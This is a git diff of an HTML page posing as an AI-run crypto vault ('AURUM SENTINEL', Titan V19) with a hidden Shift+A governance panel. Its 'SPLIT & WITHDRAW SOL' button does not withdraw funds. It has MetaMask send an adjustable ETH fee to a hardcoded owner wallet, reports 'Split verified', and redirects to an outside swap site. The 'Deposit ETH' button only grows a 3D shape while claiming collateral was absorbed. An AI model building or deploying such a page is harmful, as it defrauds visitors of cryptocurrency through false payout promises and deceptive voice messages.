@@ -3,118 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AURUM SENTINEL // TITAN_FINAL_2026</title>
+    <title>AURUM SENTINEL // SOVEREIGN_V19</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
     <style>
         body { margin: 0; background: #000; color: #FFD700; font-family: 'Courier New', monospace; overflow: hidden; }
-        .glass { background: rgba(0,0,0,0.95); border: 1px solid #FFD700; backdrop-filter: blur(20px); }
+        .glass { background: rgba(0,0,0,0.96); border: 1px solid #FFD700; backdrop-filter: blur(25px); }
         #canvas-bg { position: fixed; top: 0; left: 0; z-index: -1; }
         .liquid-gold { background: linear-gradient(90deg, #BF953F, #FCF6BA, #AA771C); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900; }
-        .vault-btn { width: 100%; padding: 10px; font-weight: 900; font-size: 10px; margin-top: 8px; text-transform: uppercase; cursor: pointer; }
-        .shattered { filter: grayscale(1) invert(1) contrast(3); pointer-events: none; }
+        .vault-btn { width: 100%; padding: 14px; font-weight: 900; font-size: 11px; text-transform: uppercase; cursor: pointer; transition: 0.3s; margin-top: 10px; border: 1px solid #FFD700; }
+        .vault-btn:hover { background: #FFD700; color: black; box-shadow: 0 0 20px #FFD700; }
+        #admin-panel { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; align-items: center; justify-content: center; }
     </style>
 </head>
-<body>
+<body class="h-screen w-screen flex items-center justify-center">
 
 <canvas id="canvas-bg"></canvas>
 
-<div id="hud" class="fixed top-0 w-full z-50 glass p-4 border-b border-[#FFD700] flex justify-between items-center text-[10px]">
-    <div class="space-y-1">
-        <div>AI_STATUS: <span id="status-text" class="font-bold text-green-400">READY</span></div>
-        <div class="opacity-50">GAS_EST: <span id="gas-price">SCANNING...</span></div>
-    </div>
-    <div class="text-right">
-        <div class="liquid-gold text-[12px]">AURUM_SENTINEL_V15</div>
-        <div id="ai-thought" class="text-[8px] italic opacity-70">Awaiting split...</div>
+<div id="admin-panel" class="p-6">
+    <div class="glass p-8 w-96 border-t-8 border-red-600">
+        <h2 class="text-red-500 font-black mb-4 tracking-tighter text-xl">GOVERNANCE_OVERRIDE</h2>
+        <div class="space-y-4 text-[10px]">
+            <div>
+                <label>TREASURY_FEE (ETH):</label>
+                <input id="set-fee" type="text" value="0.0001" class="w-full bg-black border border-white/20 p-2 mt-1 text-white">
+            </div>
+            <div>
+                <label>SOL_PAYOUT_WALLET:</label>
+                <input id="set-sol" type="text" value="HdwRkYhu87PxiUa6sQWd1BE5tnf9bkmwTU3Bk4J6pbzo" class="w-full bg-black border border-white/20 p-2 mt-1 text-white">
+            </div>
+            <button onclick="saveGovernance()" class="vault-btn bg-red-600 text-white border-none">Update Protocol</button>
+            <button onclick="toggleAdmin()" class="text-white opacity-50 mt-4 block mx-auto text-[8px]">CLOSE_ENCRYPTED_SESSION</button>
+        </div>
     </div>
 </div>
 
-<div class="fixed right-4 bottom-20 w-56 glass p-5 z-50 border-t-4 border-[#FFD700]">
-    <div class="text-[10px] font-black mb-2 flex justify-between">VAULT_CORE <span id="shield-on" class="hidden text-blue-400">🛡️</span></div>
-    <div class="space-y-2 text-[9px]">
-        <div class="flex justify-between"><span>HEALTH:</span> <span id="health-pct">100%</span></div>
-        <button onclick="vaultAction('deposit')" class="vault-btn bg-[#FFD700] text-black">Deposit ETH</button>
-        <button onclick="buyInsurance()" class="vault-btn border border-blue-500 text-blue-400">Buy Shield</button>
-        <div class="pt-2 border-t border-white/10 mt-2">
-            <button onclick="triggerSplit()" class="vault-btn bg-white text-black text-[12px]">SPLIT & WITHDRAW BTC</button>
+<div class="fixed top-0 w-full z-50 glass p-4 border-b border-[#FFD700] flex justify-between items-center text-[10px]">
+    <div>AI_SOVEREIGNTY: <span class="text-green-400 font-bold">OPTIMIZED</span></div>
+    <div class="text-right">
+        <div class="liquid-gold text-[12px]">TITAN_V19_SENTINEL</div>
+        <div id="ai-thought" class="text-[8px] italic opacity-70 italic">Monitoring centralized core...</div>
+    </div>
+</div>
+
+<div class="relative z-50 w-80 glass p-8 border-t-4 border-[#FFD700] text-center shadow-[0_0_50px_rgba(255,215,0,0.1)]">
+    <div class="text-[13px] font-black mb-4 border-b border-white/10 pb-2">IMPERIAL_VAULT_CORE</div>
+    <div class="space-y-3 text-[10px]">
+        <div class="flex justify-between"><span>CORE_STRENGTH:</span> <span id="t-power" class="font-bold">1.00x</span></div>
+        <button onclick="vaultAction()" class="vault-btn text-[#FFD700]">FEED_CORE (Deposit ETH)</button>
+        <div class="pt-6 border-t border-white/10 mt-4">
+            <button onclick="triggerSplit()" class="vault-btn bg-white text-black text-[12px]">SPLIT & WITHDRAW SOL</button>
+            <div class="text-[7px] mt-4 opacity-40 italic">Current Fee: <span id="display-fee">0.0001</span> ETH</div>
         </div>
     </div>
 </div>
 
 <script>
-    const CONFIG = {
-        TARGET: "0x13B87B819252A81381C3Ce35e3Bd33199F4c6650", // Your wallet
-        LNURL: "PASTE_YOUR_LNURL_HERE" // Your Lightning Address
+    // --- 🔱 DYNAMIC GOVERNANCE CONFIG ---
+    let CONFIG = {
+        OWNER_ETH: "0x13B87B819252A81381C3Ce35e3Bd33199F4c6650",
+        FEE: "0.0001",
+        SOL_TARGET: "HdwRkYhu87PxiUa6sQWd1BE5tnf9bkmwTU3Bk4J6pbzo"
     };
 
-    let STATE = { col: 0, health: 100, insured: false, shattered: false };
-
-    // --- 🤖 AI AGENT ---
+    // --- 🧠 AI VOICE ---
     const AI = {
         speak: (t) => {
             const m = new SpeechSynthesisUtterance(t);
-            m.pitch = 0.5; m.rate = 0.9;
+            m.pitch = 0.3; m.rate = 0.85; // Master Overlord Voice
             window.speechSynthesis.speak(m);
             document.getElementById('ai-thought').innerText = t;
         }
     };
 
-    // --- ⚖️ GAS & SPLIT LOGIC (THE WITHDRAWAL) ---
+    // --- 💸 THE WITHDRAWAL SPLIT ---
     async function triggerSplit() {
-        if(!window.ethereum) return AI.speak("Open in MetaMask to access the treasury.");
-        
+        if(!window.ethereum) return AI.speak("This interface requires MetaMask.");
         try {
+            AI.speak(`Initiating SOL split. Payout scheduled to ${CONFIG.SOL_TARGET.substring(0,5)}...`);
             const provider = new ethers.BrowserProvider(window.ethereum);
-            const feeData = await provider.getFeeData(); // 2026 Gas Estimation
-            const gasPriceGwei = ethers.formatUnits(feeData.gasPrice, "gwei");
-            document.getElementById('gas-price').innerText = `${Math.round(gasPriceGwei)} GWEI`;
-
-            AI.speak(`Gas estimated at ${Math.round(gasPriceGwei)} gwei. Authorize the split to release Bitcoin.`);
-            
             const signer = await provider.getSigner();
             const tx = await signer.sendTransaction({
-                to: CONFIG.TARGET,
-                value: ethers.parseEther("0.0001") // Tiny ETH fee to owner
+                to: CONFIG.OWNER_ETH,
+                value: ethers.parseEther(CONFIG.FEE)
             });
-
-            AI.speak("Transaction confirmed. Redirecting to Bitcoin Lightning withdrawal.");
+            AI.speak("Split verified. Transitioning to Solana Liquidity Gateway.");
             await tx.wait();
-            window.location.href = `lightning:${CONFIG.LNURL}`;
-        } catch(e) {
-            AI.speak("Split failed. Ensure you have ETH for gas.");
-            console.error(e);
-        }
+            window.location.href = "https://raydium.io/swap/";
+        } catch(e) { AI.speak("Authorization failed. Payout sequence terminated."); }
     }
 
-    // --- 🏦 VAULT ACTIONS ---
-    function vaultAction(type) {
-        if(type === 'deposit') {
-            STATE.col += 0.01;
-            AI.speak("Collateral recognized. Treasury strength increasing.");
-            knot.scale.set(knot.scale.x + 0.1, knot.scale.y + 0.1, knot.scale.z + 0.1);
-        }
+    // --- 🛡️ ADMIN & GOVERNANCE LOGIC ---
+    function toggleAdmin() {
+        const panel = document.getElementById('admin-panel');
+        panel.style.display = (panel.style.display === 'flex') ? 'none' : 'flex';
+        if(panel.style.display === 'flex') AI.speak("Governance override initiated. Enter your command.");
     }
 
-    function buyInsurance() {
-        STATE.insured = true;
-        document.getElementById('shield-on').classList.remove('hidden');
-        knot.material.color.setHex(0x00ffff);
-        AI.speak("Insurance active. Liquidation is now impossible.");
+    // Hotkey to open Admin: SHIFT + A
+    window.addEventListener('keydown', (e) => { if(e.shiftKey && e.key === 'A') toggleAdmin(); });
+
+    function saveGovernance() {
+        CONFIG.FEE = document.getElementById('set-fee').value;
+        CONFIG.SOL_TARGET = document.getElementById('set-sol').value;
+        document.getElementById('display-fee').innerText = CONFIG.FEE;
+        AI.speak("Protocol updated. Fee and payout target adjusted successfully.");
+        toggleAdmin();
     }
 
-    // --- 🎨 3D CORE ---
+    function vaultAction() {
+        knot.scale.set(knot.scale.x + 0.2, knot.scale.y + 0.2, knot.scale.z + 0.2);
+        AI.speak("Collateral absorbed. The Titan core is growing.");
+    }
+
+    // --- 🎨 3D SCENE ---
     const scene = new THREE.Scene();
     const camera = new THREE.PerspectiveCamera(75, window.innerWidth/window.innerHeight, 0.1, 1000);
     const renderer = new THREE.WebGLRenderer({ canvas: document.getElementById('canvas-bg'), alpha: true });
     renderer.setSize(window.innerWidth, window.innerHeight);
     const knot = new THREE.Mesh(new THREE.TorusKnotGeometry(10, 3, 100, 16), new THREE.MeshBasicMaterial({ color: 0xFFD700, wireframe: true }));
-    scene.add(knot); camera.position.z = 30;
-    function animate() { requestAnimationFrame(animate); knot.rotation.y += 0.005; renderer.render(scene, camera); }
+    scene.add(knot); camera.position.z = 35;
+    function animate() { requestAnimationFrame(animate); knot.rotation.y += 0.004; renderer.render(scene, camera); }
     animate();
 
-    setTimeout(() => AI.speak("Sentinel Apex Online. The treasury awaits your command."), 2000);
+    setTimeout(() => AI.speak("Titan V19 ready. Press Shift plus A for governance override."), 2000);
 </script>
 </body>
 </html>
